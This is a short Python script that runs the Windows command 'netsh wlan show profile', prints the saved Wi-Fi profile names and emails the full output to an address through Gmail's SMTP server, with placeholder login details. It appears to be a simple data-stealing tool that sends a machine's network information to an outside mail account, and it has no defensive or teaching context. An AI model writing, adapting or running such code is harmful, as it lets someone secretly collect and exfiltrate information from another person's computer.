#!/usr/bin/env python

import subprocess, smtplib, re
 
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"

# Executes command and returns results
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
# print(network_names.group(1))
for network_name in network_names_list:
    print(network_name)


send_mail("$Email ID", "$PASS", networks)
